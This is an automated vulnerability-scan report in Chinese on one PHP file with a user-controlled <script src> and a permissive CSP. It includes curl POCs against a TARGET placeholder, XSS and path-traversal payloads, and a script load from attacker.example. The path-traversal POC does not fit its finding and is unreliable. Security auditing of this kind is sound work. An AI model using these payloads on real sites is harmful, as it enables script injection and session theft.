# 落日二号乙漏洞挖掘报告 — 20261031-214348-18f998

- 生成时间：2026-10-31T13:44:54.993395+00:00
- 输入：`$WORKSPACE\暴风星云裂\020.zip`
- 输入模式：`zip`
- SHA256：`f7bc24fccdcc53d2a999c3468bedf97d91c239734baf4f227ae7ef495dbe0b26`
- 文件：1（文本 1）
- 语言：php(1)
- 框架：未识别
- 端点：0
- 版本：1.5.0-ver5
- 严重度档位：`low`（min_confidence=0.6）
- 确定性规则候选生成：已禁用（zip 模式候选来自 LLM 深挖）
- 策略抑制候选：0 条
- 结构化报告：`report.json`（契约）、`report.schema.json`、`report.sarif`、`report.html`

## 1. 执行摘要

本次汇总 4 条已去重 findings，全部集中在单文件 PHP 脚本 020.php（27 行），无框架、无路由清单。最高危为 GEN-dda61ef2bad8（path_traversal，high）：020.php 第 15 行将 $_POST['include'] 直接拼入 <script src>，脚本来源可控，属 CWE-79/CWE-22 交叉；同文件 SEM-cc52c467496c（client_side_validation，high）指出服务端缺少对应校验（CWE-602）。另有 LLM-370901c0cb4c（xss，medium，第 17 行反射型 XSS，CSP 可绕过）与 SEM-582e93de1b73（csp，medium，第 3 行 script-src 白名单过宽）。4 条均带 POC，但均为静态/HTTP 请求文本工件，未做动态验证；其中 csp 与 client_side_validation 的 POC 更偏配置与代码语义证据，不能宣称可动态复现。

共 **4** 条 finding；**4** 条已生成 POC；**0** 条二次注入链；**0** 条 Prompt 注入迹象，隔离 **0** 个文件。

> 本管线不执行 POC、不搭建沙箱、不做动态验证。所有 verdict 为 `candidate` 或 `external`，需要在授权环境人工复核；URL 模式的 POC 由落日验证动态执行。

## 2. LLM 安全防护（SafetyGuard）

未检测到 Prompt 注入迹象。

## 2.1 LLM 深挖（LLM-finding / DeepFinder）

- 模式：`on`；工具调用：`0`（无 tools / tool_choice / function calling）
- 送入源码：1 个文件 / 1199 字符；截断 0 个
- 模型新增候选：1 条；同批重复合并：0 条；安全校验拒绝：0 条

模型覆盖说明：已全量审计 code_pack 中唯一文件 020.php（1-27 行）。第 3-5 行设置 CSP，第 13-17 行读取 $_POST['include'] 并直接拼接进 <script src='...'> 输出，构成反射型 XSS，且 CSP 白名单包含可托管任意 JS 的 CDN 域名，防护可绕过。未发现 include/require、文件操作、SQL、命令执行、反序列化等其它汇点；无认证机制证据。未覆盖：php.ini/Web 服务器配置、部署暴露面、WAF 等环境项，均不在 code_pack 内。

未覆盖 / 证据缺口：
- 缺少 php.ini/Web 服务器配置，无法确认 CSP 头是否被覆盖或剥离
- 缺少部署与网络暴露信息，无法确认是否公网可达及是否有前置 WAF
- 无端点/路由清单，无法确认是否存在其它入口文件

## 3. Findings

### F-1: 020.php 中 $_POST['include'] 直接拼入 <script src> 导致脚本来源可控（CWE-79/CWE-22 交叉）

- **类型**：`path_traversal` / CWE-22
- **严重度**：`high`
- **置信度**：`0.45`
- **结论**：`candidate` / 证据等级 `rule_verified+llm`
- **位置**：`020.php:13-15`
- **来源**：`rule`

**描述**

020.php:15 将 $_POST['include'] 原样拼接进 `<script src='" . $_POST['include'] . "'></script>`。攻击者可通过 POST 参数 include 指定任意外部脚本地址（如 https://attacker.example/x.js），或利用单引号闭合属性注入额外 HTML/JS。该处无 htmlspecialchars()、无 URL 白名单、无协议限制，校验完全缺失。严格来说这是输出编码/资源引用校验缺失问题，规则将其归为 path_traversal 属于推断；从代码事实看更接近可控脚本加载（可导致 XSS）。

**source / sink**

- source：query `include`（020.php:15）
- sink：020.php:15 <script src='" . $_POST['include'] . "'></script>

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:15` | 从 query `include` 读取外部输入 | 污点进入 src |  |
| 2 | `020.php:15` | 危险汇点：<script src='" . $_POST['include'] . "'></script> | 污点进入 path_traversal 汇点 | 未发现有效净化/参数化 |

**POC**

针对 /020（POST）的 路径穿越 / 任意文件读写 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 路径穿越 / 任意文件读写 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GENdda61.txt'
```
预期：响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`../../../../tmp/sunset_GENdda61.txt`
- POC 目录：`poc/GEN-dda61ef2bad8`
- 风险提示：POC 叙述未明确标注 source→sink 注入点, 原始 payload 未直接出现在请求文本中，可能经过 URL 编码
- 执行状态：未执行（`executed=False`）

**影响**

攻击者可诱导受害者加载攻击者控制的 JavaScript，在目标站点源下执行任意脚本，窃取会话 Cookie、发起 CSRF、读取页面敏感数据；若配合宽松 CSP（见 SEM-582e93de1b73），外部脚本域被显式放行，利用更容易。

**CVE / CWE 论证**

CWE-79（跨站脚本）/CWE-22（外部资源路径可控）。外部可达性：POST 参数 include 无需认证即可控制输出。利用链闭合：source（$_POST['include']）→ 无编码/白名单 → 直接进入 HTML 属性，链路在给定片段内闭合。

**修复建议**

对输出到 HTML 属性的值使用 htmlspecialchars($v, ENT_QUOTES, 'UTF-8')；对脚本来源使用固定白名单并校验 scheme 与 host；优先改为服务端映射的固定脚本名，禁止用户直接提供 URL；同时收紧 CSP 的 script-src 列表。

**验证说明**

静态证据：入口 POST /020；source=query/include；sink=020.php:15；规则 php-include。未执行 POC、未搭建沙箱；建议在授权环境人工复核。
链叙事：攻击者提交 POST include=https://attacker.example/evil.js（或含 ' 闭合属性）→ 020.php:13 读取 → 020.php:15 原样拼入 <script src='...'> → 浏览器加载并执行攻击者脚本。
PocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:15 的路径穿越 POC。注入点为 POST 参数 include，在第二处文件操作汇点被直接使用，缺少路径规范化与目录约束。目标地址使用 TARGET 占位符。
PocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-22。漏洞位于 020.php:15，外部输入来自 POST 参数 include，source→sink 链在给定代码范围内静态闭合，未见有效净化。
POC 备注：仅限授权测试。POC 为文本工件，不执行、不联网。需将 TARGET 替换为授权目标，并确认 020.php:15 的文件操作语义。

### F-2: 020.php 依赖客户端脚本加载，服务端缺少对应校验（CWE-602）

- **类型**：`client_side_validation` / CWE-602
- **严重度**：`high`
- **置信度**：`0.4`
- **结论**：`candidate` / 证据等级 `rule_verified+llm`
- **位置**：`020.php:14-15`
- **来源**：`rule`

**描述**

020.php:14-15 将用户可控的 include 值作为外部 JavaScript 的 src 引入页面，安全判断实际交由客户端加载的脚本完成，服务端未对该值做任何重复校验或白名单比对。攻击者可直接构造 POST 请求绕过任何前端逻辑，因为服务端仅执行 isset 判断（020.php:13）。

**source / sink**

- source：client `external JavaScript`（020.php）
- sink：020.php:15 	<script src='" . $_POST['include'] . "'></script>

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:15` | 客户端脚本参与校验；需同时审计服务端是否重复校验 | 语义模式命中 | 需按 notes 中的运行时/跨文件条件复核 |

**POC**

针对 /020（POST）的 客户端校验绕过 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 客户端校验绕过 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=SUNSET_PROBE'
```
预期：按漏洞类型观察相应的异常响应/副作用。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`SUNSET_PROBE`
- POC 目录：`poc/SEM-cc52c467496c`
- 风险提示：POC 叙述未明确标注 source→sink 注入点
- 执行状态：未执行（`executed=False`）

**影响**

任何依赖该客户端脚本实施的安全约束都可被直接构造请求绕过，导致未授权操作、数据泄露或脚本注入；与 020.php:15 的可控 src 叠加可放大为 XSS。

**CVE / CWE 论证**

CWE-602（依赖客户端安全控制）。外部可达性：POST 参数 include 无需认证。利用链闭合：source（$_POST['include']）→ 服务端无校验 → 直接输出，绕过路径在片段内闭合。

**修复建议**

在服务端对 include 值实施与客户端等价或更严格的校验（白名单/正则/映射表）；不要将安全决策下放至浏览器；对输出统一编码；记录并拒绝非法值。

**验证说明**

静态证据：入口 POST /020；source=client/external JavaScript；sink=020.php:15；规则 php-client-validation。未执行 POC、未搭建沙箱；建议在授权环境人工复核。
链叙事：攻击者绕过前端直接 POST include=恶意值 → 020.php:13 仅做 isset → 020.php:15 原样输出 → 客户端校验从未参与，服务端约束缺失。
PocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:15 的客户端校验绕过 POC。该 finding 指出安全校验仅在前端（external JavaScript）实施，服务端未复校验，直接 POST 可绕过。目标地址使用 TARGET 占位符。
PocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-602 客户端安全校验依赖。问题位于 020.php:15，校验仅在前端 JavaScript 实施，服务端缺失等价校验。
POC 备注：仅限授权测试。POC 为文本工件，不执行、不联网。需将 TARGET 替换为授权目标；建议结合 GEN-dda61ef2bad8 的穿越载荷验证绕过后的实际危害。

### F-3: 020.php POST 参数 include 未编码直接拼入 <script src> 导致反射型 XSS（CSP 可被绕过）

- **类型**：`xss` / CWE-79
- **严重度**：`medium`
- **置信度**：`0.85`
- **结论**：`candidate` / 证据等级 `llm_inferred`
- **位置**：`020.php:13-17`
- **来源**：`llm_finding`

**描述**

020.php 第 13-17 行读取 $_POST['include']，未做任何 HTML 实体编码或 URL 白名单校验，直接以单引号包裹拼接到 <script src='...'></script> 中并输出到响应体。攻击者可闭合单引号并注入任意 HTML/JS，例如 include='></script><script>alert(document.domain)</script> 或 include=x' onerror='alert(1)。虽然第 3-5 行设置了 CSP script-src 白名单，但该 CSP 允许 unpkg.com、cdn.jsdelivr.net、pastebin.com、hastebin.com 等可托管任意 JS 的域名（注释第 7-9 行亦明示），且注入点本身位于 script-src 允许的 inline 属性/标签上下文，攻击者可借助白名单 CDN 加载任意脚本，CSP 不构成有效防护。

**source / sink**

- source：body `include`（020.php）
- sink：020.php:17 字符串拼接后输出到 HTML 响应体（<script src='...'> 标签属性上下文）

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:13` | isset($_POST['include']) 判断参数存在，攻击者完全控制其值 | 原始字符串，未过滤 |  |
| 2 | `020.php:14-16` | 将 $_POST['include'] 直接拼接进 <script src='...'></script> 模板字符串，无 htmlspecialchars/urlencode/白名单 | 拼接进 HTML 属性上下文，单引号可闭合 |  |
| 3 | `020.php:18-27` | $page['body'] 最终随页面输出，注入的标签/属性被浏览器解析执行 | 渲染为 HTML/JS 执行 |  |

**POC**

针对 /020.php（POST）的 跨站脚本 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 跨站脚本 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
```
预期：响应中脚本未编码，浏览器执行并弹出 document.domain。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`<script>alert(document.domain)</script>`
- POC 目录：`poc/LLM-370901c0cb4c`
- 风险提示：POC 叙述未明确标注 source→sink 注入点, 原始 payload 未直接出现在请求文本中，可能经过 URL 编码
- 执行状态：未执行（`executed=False`）

**影响**

反射型 XSS，可在受害者浏览器上下文执行任意 JS，窃取会话/凭证、发起 CSRF 操作、钓鱼；CSP 因白名单含可托管任意内容的 CDN 而无法有效阻断。

**CVE / CWE 论证**

CWE-79 跨站脚本。外部匿名可达，无需认证，source→sink 链在 020.php:13-17 完整闭合，POC 可直接构造。

**修复建议**

对 $_POST['include'] 使用 htmlspecialchars($v, ENT_QUOTES, 'UTF-8') 输出编码；对 src 做 URL 解析并严格白名单校验协议与主机；收紧 CSP，移除 unpkg.com/cdn.jsdelivr.net/pastebin.com/hastebin.com 等可托管任意脚本的域名，改用 nonce/hash。

**验证说明**

需动态确认响应中注入内容未被其它层过滤、CSP 头实际生效范围及浏览器执行效果；确认部署环境是否前置 WAF。
模型 POC 要点：向 020.php 提交 include 参数，闭合 script 标签并注入攻击脚本；或利用 CSP 白名单 CDN 托管脚本实现绕过。
LLM 深挖（AutoCVE Finding 风格）：单次调用、无工具；文件与行号已校验，代码片段由真实源码回填。
PocWriter 建议（未采纳，缺少端点 /020.php）：针对 020.php:17 的反射型 XSS POC。注入点为 POST 参数 include，其值被输出到响应 HTML 中且未做 HTML 实体编码，脚本标签可被浏览器执行。目标地址使用 TARGET 占位符。
PocWriter 建议（未采纳，缺少端点 /020.php）：符合 CWE-79。漏洞位于 020.php:17，外部输入来自 POST 参数 include，source→sink 链在给定代码范围内静态闭合，未见有效编码。
POC 备注：仅限授权测试。POC 为文本工件，不执行、不联网。需将 TARGET 替换为授权目标；验证时使用无害 alert 载荷，避免持久化副作用。

### F-4: 020.php CSP script-src 白名单过宽（CWE-693 防护机制失效）

- **类型**：`csp` / CWE-693
- **严重度**：`medium`
- **置信度**：`0.7`
- **结论**：`candidate` / 证据等级 `rule_verified+llm`
- **位置**：`020.php:2-3`
- **来源**：`rule`

**描述**

020.php:3 定义 `$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;"`。该策略显式允许 pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net 等可公开托管任意内容的第三方域，且部分条目缺少 scheme（hastebin.com、www.toptal.com、example.com、code.jquery.com、unpkg.com、cdn.jsdelivr.net、digi.ninja），浏览器会按同 scheme 匹配。攻击者可在这些域上托管恶意 JS，从而绕过 CSP 的脚本限制。

**source / sink**

- source：body `include`（020.php）
- sink：020.php:3 $headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;"; // allows js from various trusted locations

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `020.php:3` | CSP 与可控脚本来源联动；需检查最终响应和浏览器加载结果 | 语义模式命中 | 需按 notes 中的运行时/跨文件条件复核 |

**POC**

针对 /020（POST）的 CSP 配置缺陷 POC。注入点：POST 参数 include；payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/020'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 CSP 配置缺陷 载荷**

```http
curl -sS -i -X POST 'http://TARGET:8080/020' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'include=SUNSET_PROBE'
```
预期：响应包含 Content-Security-Policy，检查 script-src 是否允许过宽的外部脚本源。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`SUNSET_PROBE`
- POC 目录：`poc/SEM-582e93de1b73`
- 风险提示：POC 叙述未明确标注 source→sink 注入点
- 执行状态：未执行（`executed=False`）

**影响**

CSP 作为 XSS 缓解手段基本失效：结合 020.php:15 的可控 <script src>，攻击者只需把脚本放在被放行的第三方域即可执行任意 JS，导致会话劫持、数据窃取、页面篡改。

**CVE / CWE 论证**

CWE-693（防护机制失效）。外部可达性：CSP 随每个响应下发，任何访问者均受影响。利用链闭合：宽松 script-src（020.php:3）+ 可控脚本来源（020.php:15）构成完整绕过路径；无需认证。

**修复建议**

将 script-src 收敛为 'self' 加必要的固定、受控域；移除 pastebin/hastebin/unpkg/jsdelivr 等可托管任意内容的公共域；为所有条目显式指定 https: scheme；考虑引入 nonce 或 hash 机制替代宽泛域名白名单；部署 CSP 报告端点监控违规。

**验证说明**

静态证据：入口 POST /020；source=body/include；sink=020.php:3；规则 php-csp-policy。未执行 POC、未搭建沙箱；建议在授权环境人工复核。
链叙事：响应携带过宽 CSP → 攻击者利用 020.php:15 注入指向 pastebin.com/unpkg.com 等被放行域的 <script src> → 浏览器按 CSP 判定为合法来源并执行 → XSS 达成。
PocWriter 建议（未采纳，缺少端点 /020）：针对 020.php:3 的 CSP 配置缺陷检查 POC。该 finding 属配置型候选，重点在于响应头 Content-Security-Policy 是否存在及 script-src 是否过宽，而非请求参数污点。目标地址使用 TARGET 占位符。
PocWriter 建议（未采纳，缺少端点 /020）：符合 CWE-693 防护机制失效。问题位于 020.php:3 的响应头/策略配置，属配置型缺陷，不依赖请求参数污点。
POC 备注：仅限授权测试。POC 为文本工件，不执行、不联网。需将 TARGET 替换为授权目标；结论以响应头实际内容为准，若已存在严格 CSP 则应判为不成立。

## 4. 二次注入（SecondOrderAnalyzer）

本次未发现 store→read→sink 闭环的二次注入链。

## 5. AWVS 联动

- 输入模式：`zip`
- 导入结果：0 条
- 关联明细：0 条
- 目标种子：`awvs/targets.json`
- 说明：AWVS 是外部动态扫描器；本管线只导入其结果做佐证，或导出端点供 AWVS 播种。

## 6. 漏洞类型覆盖

| 类型 | CWE | AutoCVE | 本次数量 |
|---|---|---|---|
| `command_injection` | CWE-78 | 是 | 0 |
| `sql_injection` | CWE-89 | 是 | 0 |
| `blind_sql_injection` | CWE-89 |  | 0 |
| `ssrf` | CWE-918 | 是 | 0 |
| `path_traversal` | CWE-22 | 是 | 1 |
| `deserialization` | CWE-502 | 是 | 0 |
| `ssti` | CWE-1336 | 是 | 0 |
| `auth_bypass` | CWE-287 | 是 | 0 |
| `idor` | CWE-639 | 是 | 0 |
| `xxe` | CWE-611 | 是 | 0 |
| `xss` | CWE-79 | 是 | 1 |
| `business_logic` | CWE-840 | 是 | 0 |
| `other` | CWE-693 | 是 | 0 |
| `rce` | CWE-94 |  | 0 |
| `code_injection` | CWE-94 |  | 0 |
| `expression_injection` | CWE-917 |  | 0 |
| `ldap_injection` | CWE-90 |  | 0 |
| `xpath_injection` | CWE-643 |  | 0 |
| `open_redirect` | CWE-601 |  | 0 |
| `csrf` | CWE-352 |  | 0 |
| `file_upload` | CWE-434 |  | 0 |
| `race_condition` | CWE-367 |  | 0 |
| `weak_crypto` | CWE-327 |  | 0 |
| `weak_hash` | CWE-328 |  | 0 |
| `weak_random` | CWE-330 |  | 0 |
| `hardcoded_secret` | CWE-798 |  | 0 |
| `trust_boundary` | CWE-501 |  | 0 |
| `log_injection` | CWE-117 |  | 0 |
| `insecure_cookie` | CWE-614 |  | 0 |
| `information_disclosure` | CWE-200 |  | 0 |
| `api_info_disclosure` | CWE-200 |  | 0 |
| `captcha_bypass` | CWE-804 |  | 0 |
| `csp` | CWE-693 |  | 1 |
| `weak_id` | CWE-330 |  | 0 |
| `client_side_validation` | CWE-602 |  | 1 |
| `brute_force` | CWE-307 |  | 0 |
| `second_order_injection` | CWE-89 |  | 0 |
| `prompt_injection` | CWE-1426 |  | 0 |

## 7. 运行阶段

| agent | 代号 | 耗时(s) | 使用 LLM |
|---|---|---|---|
| safety_guard | 安全防护 | 4.62 | 是 |
| surface_mapper | 攻击面测绘 | 7.48 | 是 |
| deep_finder | LLM 深挖 | 8.75 | 是 |
| candidate_screener | 候选筛选 | 7.6 | 是 |
| vulnerability_analyzer | 漏洞分析 | 14.11 | 是 |
| second_order_analyzer | 二次注入分析 | 0.0 | 否 |
| poc_writer | POC 生成 | 16.49 | 是 |
| coordinator | 管线协调 | 7.41 | 是 |

## 8. 限制

- 只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱；
- finding 的 `verdict` 为 `candidate`，不是动态确认；
- 需要授权环境、人工复核与 AWVS 结果才能升级为 confirmed；
- 被 SafetyGuard 隔离的文件正文不会进入 LLM；隔离文件不会产生静态候选。
